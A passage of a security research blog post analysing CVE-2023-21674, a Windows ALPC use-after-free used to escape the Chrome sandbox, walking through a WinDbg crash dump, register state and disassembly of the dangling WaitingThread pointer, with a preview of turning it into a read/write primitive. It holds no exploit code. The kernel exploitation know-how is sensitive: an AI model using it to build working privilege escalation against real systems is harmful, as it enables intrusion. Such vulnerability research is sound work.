+fffff803`<span class="hljs-number">7e0</span>fcf6c <span class="hljs-number">48878178050000</span>  xchg    rax,qword ptr [rcx+<span class="hljs-number">578</span>h]
+
+STACK_TEXT:
+ffffc182`d4b55c58 fffff803`<span class="hljs-number">7</span>df61ac2     : ffffc182`d4b55dc0 fffff803`<span class="hljs-number">7</span>dd92480 fffff803`<span class="hljs-number">7</span>c664180 ffff900d`cddceb01 : nt!DbgBreakPointWithStatus
+ffffc182`d4b55c60 fffff803`<span class="hljs-number">7</span>df611b3     : fffff803`<span class="hljs-number">00000003</span> ffffc182`d4b55dc0 fffff803`<span class="hljs-number">7</span>de4aaa0 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000050</span> : nt!KiBugCheckDebugBreak+<span class="hljs-number">0x12</span>
+ffffc182`d4b55cc0 fffff803`<span class="hljs-number">7</span>de31807     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffffc182`d4b56690 ffff900d`cddceb78 : nt!KeBugCheck2+<span class="hljs-number">0xba3</span>
+ffffc182`d4b56430 fffff803`<span class="hljs-number">7</span>de8a32f     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000050</span> ffff900d`cddceb78 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffffc182`d4b56690 : nt!KeBugCheckEx+<span class="hljs-number">0x107</span>
+ffffc182`d4b56470 fffff803`<span class="hljs-number">7</span>dc5ccac     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000048</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffffc182`d4b56629 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!MiSystemFault+<span class="hljs-number">0x23059f</span>
+ffffc182`d4b56570 fffff803`<span class="hljs-number">7</span>de42329     : ffffffff`ffffffff <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : nt!MmAccessFault+<span class="hljs-number">0x29c</span>
+ffffc182`d4b56690 fffff803`<span class="hljs-number">7e0</span>fcf6c     : ffffa307`cb0b0ce0 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000008</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> ffff900d`<span class="hljs-number">72</span>a48f80 : nt!KiPageFault+<span class="hljs-number">0x369</span>
+ffffc182`d4b56820 fffff803`<span class="hljs-number">7e0</span>fc09b     : ffffffff`<span class="hljs-number">00000001</span> ffff900d`c9466e20 <span class="hljs-number">00000000</span>`<span class="hljs-number">00010000</span> ffffffff`ffffffff : nt!AlpcpCancelMessage+<span class="hljs-number">0x358</span>
+ffffc182`d4b568a0 fffff803`<span class="hljs-number">7e0</span>fbdef     : ffffffff`ffffffff ffff900d`c9466e20 ffff900d`c9466f80 ffff900d`c9466e20 : nt!AlpcpFlushQueue+<span class="hljs-number">0x117</span>
+ffffc182`d4b568e0 fffff803`<span class="hljs-number">7e0</span>fc24f     : ffffffff`ffffffff ffffffff`ffffffff ffffc182`d4b56a49 ffff900d`c9466e20 : nt!AlpcpFlushMessagesPort+<span class="hljs-number">0x27</span>
+ffffc182`d4b56920 fffff803`<span class="hljs-number">7e0</span>fc97b     : ffff900d`c9466e20 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffff900d`<span class="hljs-number">4</span>cdeef20 <span class="hljs-number">00000000</span>`<span class="hljs-number">00040286</span> : nt!AlpcpDoPortCleanup+<span class="hljs-number">0x8f</span>
+ffffc182`d4b56960 fffff803`<span class="hljs-number">7e0</span>cae78     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffc182`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">0000052</span>c ffffffff`ffffffff : nt!AlpcpClosePort+<span class="hljs-number">0x4b</span>
+ffffc182`d4b56990 fffff803`<span class="hljs-number">7e0</span>c85a9     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000544</span> ffffc182`d4b56a00 <span class="hljs-number">00000000</span>`<span class="hljs-number">0000052</span>c ffffa307`<span class="hljs-number">00000002</span> : nt!ObpCloseHandle+<span class="hljs-number">0x298</span>
+ffffc182`d4b56ab0 fffff803`<span class="hljs-number">7</span>de464e5     : ffff900d`c22be600 ffff900d`c22be600 ffffffff`e8287c00 ffff900d`<span class="hljs-number">00000000</span> : nt!NtClose+<span class="hljs-number">0x39</span>
+ffffc182`d4b56ae0 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">9</span>a12efe4     : <span class="hljs-number">000001</span>a9`c18c1352 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">9</span>a12f850 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span> ffffffff`e8287c00 : nt!KiSystemServiceCopyEnd+<span class="hljs-number">0x25</span>
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb718 <span class="hljs-number">000001</span>a9`c18c1352     : <span class="hljs-number">00007f</span>ff`<span class="hljs-number">9</span>a12f850 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span> ffffffff`e8287c00 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">99208960</span> : ntdll!NtClose+<span class="hljs-number">0x14</span>
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb720 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">9</span>a12f84f     : <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span> ffffffff`e8287c00 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">99208960</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : <span class="hljs-number">0x000001a9</span>`c18c1352
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb728 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span>     : ffffffff`e8287c00 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">99208960</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : ntdll!NtResumeThread+<span class="hljs-number">0x1f</span>
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb730 ffffffff`e8287c00     : <span class="hljs-number">00007f</span>ff`<span class="hljs-number">99208960</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : <span class="hljs-number">0x00007fff</span>`<span class="hljs-number">00000000</span>
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb738 <span class="hljs-number">00007f</span>ff`<span class="hljs-number">99208960</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span> : <span class="hljs-number">0xffffffff</span>`e8287c00
+<span class="hljs-number">0000006</span>d`<span class="hljs-number">6</span>d3fb740 <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00007f</span>ff`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> : KERNEL32!SleepStub
+
+SYMBOL_NAME:  nt!AlpcpCancelMessage+<span class="hljs-number">358</span>
+
+MODULE_NAME:ntIMAGE_NAME:  ntkrnlmp.exe
+
+STACK_COMMAND:.process /r /p <span class="hljs-number">0xffff900dc2556240</span>; .thread /r /p <span class="hljs-number">0xffff900dc22be600</span> ; kbBUCKET_ID_FUNC_OFFSET:  <span class="hljs-number">358</span>
+
+FAILURE_BUCKET_ID:  AV_VRFK_nt!AlpcpCancelMessage
+
+OS_VERSION:  <span class="hljs-number">10.0</span><span class="hljs-number">.22621</span><span class="hljs-number">.1</span>
+
+BUILDLAB_STR:  ni_release
+
+OSPLATFORM_TYPE:  x64
+
+OSNAME:  Windows <span class="hljs-number">10</span>
+
+FAILURE_ID_HASH:  {b76e5108-ed87-f585<span class="hljs-number">-7</span>c9b<span class="hljs-number">-99750f</span>572740}
+
+Followup:     MachineOwner</code></pre>
+<p>Cracking the dump open in <code>kd</code> after the BSOD, the STOP code is <code>PAGE_FAULT_IN_NONPAGED_AREA (0x50)</code>, the faulting IP is <code>nt!AlpcpCancelMessage + 0x358</code>, and the faulting instruction is <code>xchg qword ptr [reg+578h], reg2</code>. Exactly where we predicted! But <code>!analyze -v</code> only tells us &#x201C;it died here,&#x201D; not &#x201C;why it <em>had</em> to die here&#x201D;&#x2026; so let&#x2019;s rewind to the actual register state at the moment of the fault!</p>
+<pre><code class="hljs cpp"><span class="hljs-number">0</span>: kd&gt; .process /r /p <span class="hljs-number">0xffff900dc2556240</span>
+<span class="hljs-number">0</span>: kd&gt; .thread /r /p <span class="hljs-number">0xffff900dc22be600</span>
+<span class="hljs-number">0</span>: kd&gt; .frame /r <span class="hljs-number">7</span>
+<span class="hljs-number">07</span> ffffc182d4b56820 fffff8037e0fc09b     nt!AlpcpCancelMessage+<span class="hljs-number">0x358</span>
+rax=<span class="hljs-number">0000000000000000</span> rbx=ffffa307cb0b0ce0 rcx=ffff900dcddce600
+rdx=<span class="hljs-number">000000006b</span>577350 rsi=<span class="hljs-number">0000000000000000</span> rdi=<span class="hljs-number">0000000000000000</span>
+rip=fffff8037e0fcf6c rsp=ffffc182d4b56820 rbp=<span class="hljs-number">0000000000000001</span>
+r8=<span class="hljs-number">0000000000000000</span>  r9=<span class="hljs-number">7f</span>fffffffffffffc r10=<span class="hljs-number">0000000000000000</span>
+r13=<span class="hljs-number">0000000000000000</span>  r14=ffff900dc9466e20 r15=<span class="hljs-number">0000000000000001</span>
+nt!AlpcpCancelMessage+<span class="hljs-number">0x358</span>:
+fffff803`<span class="hljs-number">7e0</span>fcf6c <span class="hljs-number">48878178050000</span>  xchg    rax,qword ptr [rcx+<span class="hljs-number">578</span>h]</code></pre>
+<p><code>.frame /r 7</code> restores the register context all the way down to stack frame 7 (<code>AlpcpCancelMessage</code>). Right after a raw <code>!analyze -v</code>, kd is parked at <code>DbgBreakPointWithStatus</code>, and whatever <code>r</code> prints reflects &#x201C;wherever the debugger is stopped,&#x201D; not the values from the moment the kernel died. This command turns the clock back.</p>
+<p>Of the rolled-back values, here are the ones we care about:</p>
+<ul>
+<li>rip = nt!AlpcpCancelMessage+0x358 &#x2014; that exact xchg</li>
+<li>rcx = ffff900dcddce600 &#x2014; the dangling pointer</li>
+<li>rax = 0, r13 = 0 &#x2014; the value being written (just 0)</li>
+<li>rbx = ffffa307cb0b0ce0 &#x2014; the msg we&#x2019;re currently iterating on</li>
+</ul>
+<p>Now if we just peel back a few instructions around the xchg, the picture of why it died right here comes into focus!!</p>
+<pre><code class="hljs cpp"><span class="hljs-number">0</span>: kd&gt; u nt!AlpcpCancelMessage+<span class="hljs-number">0x340</span> L10
++<span class="hljs-number">0x340</span>   call nt!PsReleaseProcessWakeCounter    ; other cleanup work
++<span class="hljs-number">0x349</span>   mov  [rbx+<span class="hljs-number">0</span>D8h], r13                    ; msg[+<span class="hljs-number">0xD8</span>] = <span class="hljs-number">0</span> (flag stuff)
++<span class="hljs-number">0x350</span>   mov  rcx, [rbx+<span class="hljs-number">20</span>h]                     ; load msg[+<span class="hljs-number">0x20</span>] into rcx
++<span class="hljs-number">0x354</span>   test rcx, rcx                           ;   <span class="hljs-literal">NULL</span> check
++<span class="hljs-number">0x357</span>   je   +<span class="hljs-number">0x3c9</span>                             ;   <span class="hljs-keyword">if</span> <span class="hljs-literal">NULL</span>, skip <span class="hljs-keyword">this</span> logic
++<span class="hljs-number">0x359</span>   mov  rax, r13                           ; rax = <span class="hljs-number">0</span> (value to erase with)
++<span class="hljs-number">0x35C</span>   xchg rax, [rcx+<span class="hljs-number">578</span>h]                    ; atomic-write <span class="hljs-number">0</span> into +<span class="hljs-number">0x578</span> of what rcx points to
++<span class="hljs-number">0x363</span>   cmp  rax, rbx                           ; check <span class="hljs-keyword">if</span> the previous value was our msg pointer</code></pre>
+<p>Pull out some kernel-object pointer stored at offset 0x20 of msg, then atomically write 0 into that object&#x2019;s +0x578 field. As the Part 2 kernel RE spelled out, <code>msg[+0x20]</code> is exactly the WaitingThread field &#x2014; the pressure point of our UAF. <code>AlpcpDispatchNewMessage</code> plants the trigger thread&#x2019;s <code>_ETHREAD</code> pointer into this field at send time, and 40 seconds later, when we close the handle, port cleanup dereferences this field again to try to clean up the pending state&#x2026; but? That thread is already dead and its <code>_ETHREAD</code> itself has been freed!</p>
+<p>But honestly &#x2014; this BSOD is only circumstantial evidence that the &#x201C;UAF actually stepped on a dangling pointer&#x201D;; it is not a complete Sandbox Escape yet! &#x1F643; For the exploit to work, that pointer left in <code>msg+0x20</code> can&#x2019;t be pointing at just any random page &#x2014; we need to <strong>reclaim</strong> the slab so it points at a <strong>live <code>_ETHREAD</code> that we control</strong>. Right now we&#x2019;re basically just faceplanting on top of the dangling.</p>
+<p>Tai Lung got his feather and the chains came off, but there&#x2019;s still a long road ahead before he can go find Master Shifu &#x2014; that&#x2019;s where we are!!</p>
+<h1 id="4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview"><a href="#4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview" class="headerlink" title="4. Outro: So how do you actually exploit this? (Step 6 preview)"></a>4. Outro: So how do you actually exploit this? (Step 6 preview)</h1><p>You made it &#x2014; nice work! But as you may have noticed, everything we did up to here was really just me taking Theori&#x2019;s original write-up and padding it with stuff I dug up on my own. The genuinely fun part starts now, haha</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image14.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Even Theori itself basically just says &#x201C;use file pickers and you can chain this all the way to Medium code execution&#x201D; and leaves it at that.. as for the actual details? Silence. &#x1F602; <del>But there&#x2019;s no way I&#x2019;m gonna give up on that</del></p>
+<p>How this UAF gets us a <strong>Read/Write primitive</strong>, and how that primitive gets us to <strong>Medium-privilege code execution</strong> &#x2014; i.e. how, holding OUYA77&#x2019;s &#x201C;feather for Tai Lung,&#x201D; we break out of the prison cell and go find Master Shifu &#x2014; continues in the next <strong>Step 6</strong>!</p>
+<p>See you in the next one~ &#x1F44B;</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference."></a>Reference.</h1><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp">https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/Windows-Kernel/">Windows Kernel</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chromium/">Chromium</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Sandbox-Escape/">Sandbox Escape</a>
+                  
+                  <a class="hover-with-bg" href="/tags/gongjae/">gongjae</a>
+                  
+                  <a class="hover-with-bg" href="/tags/IPC/">IPC</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Wipeload/">Wipeload</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chrome-Sandbox/">Chrome Sandbox</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Mojo/">Mojo</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_gongjae.jpg" srcset="/img/loading.gif" alt="gongjae">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">gongjae</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/gongjae">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2026/07/19/gongjae/Wipeload_step5/KR/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[도닦기] 5단계: 미안하다 이거 보여주려고 ALPC 공부했다 (KR)</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2026/07/15/ogu123/CVE-2026-24450/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2026-24450: LibRaw uncompressed_fp_dng_load_raw heap overflow 취약점</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Wipeload Step 5.] Sorry, I studied ALPC just to show you this (EN)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
